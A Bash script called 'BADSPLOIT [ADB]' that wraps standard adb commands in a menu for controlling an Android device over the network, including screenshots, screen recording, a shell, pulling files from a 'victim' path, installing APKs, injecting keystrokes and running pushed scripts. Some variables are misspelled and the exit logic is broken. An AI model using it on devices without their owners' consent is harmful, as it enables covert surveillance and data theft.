#!/bin/bash

mkdir output

de_path="output"
vi_path_p="sdcard/new.png"
vi_path_v="sdcard/new.mp4"
push_path="sdcard/"
running="true"


script(){

touch run.sh
nano run.sh
chmod 777 run.sh
adb push run.sh sdcard/
adb shell sh sdcard/run.sh
rm run.sh
adb shell rm sdcard/run.sh


}



list(){

echo " "
echo "[>] 1 -- connect "
echo "[>] 2 -- disconnect "
echo "[>] 3 -- screenshot"
echo "[>] 4 -- screenrecord"
echo "[>] 5 -- shell "
echo "[>] 6 -- pull "
echo "[>] 7 -- push "
echo "[>] 8 -- install"
echo "[>] 9 -- dumpsys "
echo "[>] 10 -- packages "
echo "[>] 11 -- web search"
echo "[>] 12 -- send keys"
echo "[>] 13 -- send text"
echo "[>] 14 -- run"
echo "[>] 15 -- script"
echo "[>] list -- list "
echo "[>] banner -- banner "
echo "[>] help -- help menue "
echo "[>] 0 -- exit "
echo " "


}


banner(){
clear
echo " "
echo "        BADSPLOIT  [ADB] v.1      "
echo " "

}

banner

echo "                       by Kavishka Gihan     " 

list

main(){

echo " "
echo "Badsploit"
read what


if [[ $what == "1" ]]; then
	echo "[+] ip address"
	read ip
	adb connect $ip
	
elif [[ $what == "2" ]]; then
	adb disconnect
	
elif [[ $what == "3" ]]; then
	adb shell screencap $vi_path_p && adb pull $vi_path_p $de_path
	
elif [[ $what == "4" ]]; then
	echo "[+] time"
	read times
	echo "Recording"
	adb shell screenrecord $vi_path_v --time-limit $times && adb pull $vi_path_v $de_path
	
elif [[ $what == "5" ]]; then
	adb shell
	
elif [[ $what == "6" ]]; then
	echo "[+] victim file path"
	read path_pull
	adb pull $path_pull $de_path
	
elif [[ $what == "7" ]]; then
	echo "[+] local file path"
	read path_push
	adb push $path_push $push_path
	
elif [[ $what == "8" ]]; then
	echo "[+] apk file apth"
	read path_installl
	echo "[+] destination path"
	read dpath
	adb install $path_install $dpath
	
elif [[ $what == "9" ]]; then
	adb shell dumpsys window windows | grep -i focus
	
elif [[ $what == "10" ]]; then
	adb shell pm list packages

elif [[ $what == "11" ]]; then
	echo "[+] wesite"
	read website
	echo " "
	echo "[1] web view"
	echo "[2] explorer"
	read meth
	if [[ $meth == "1" ]]; then
		adb shell am start -a android.intent.action.VIEW -d $website
	elif [[ $meth == "2" ]]; then
		adb shell input keyevent KEYCODE_EXPLORER && adb shell input keyevent KEYCODE_SEARCH && adb shell input text $website && adb shell input keyevent KEYCODE_ENTER
	else
		echo "wrong choice"
	fi

elif [[ $what == "12" ]]; then
	echo "[+] type "
	echo " "
	echo "[1] text"
	echo "[2] number"
	read ty
	if [[ $ty == "1" ]]; then
		echo "[+] keycode (HOME)"
		read code
		adb shell input keyevent KEYCODE_$code	
	elif [[ $ty == "2" ]]; then
		echo "[+] number (66)"
		read cod
		adb shell input keyevent $cod
	else
		echo "wrong choice "
	fi
	

elif [[ $what == "13" ]]; then
	echo "[+] text"
	read text
	adb shell input text $text
elif [[ $what == "14" ]]; then
	echo "[+] Activity package"
	read act
	adb shell am start -n $act

elif [[ $what == "15" ]]; then
	script


elif [[ $what == "list" ]]; then
	list
	
elif [[ $what == "banner" ]]; then
	banner

elif [[ $what == "clear" ]]; then
	clear	

elif [[ $what == "help" ]]; then
	echo "[?] Use 'list' command to get the available commands"

elif [[ $what == "0" ]]; then
	echo "Have a nice day. "
	unset $running
	running=="false"
else	
	echo "wrong choice"
fi



}




while [ $running == "true" ]
do
	main
done
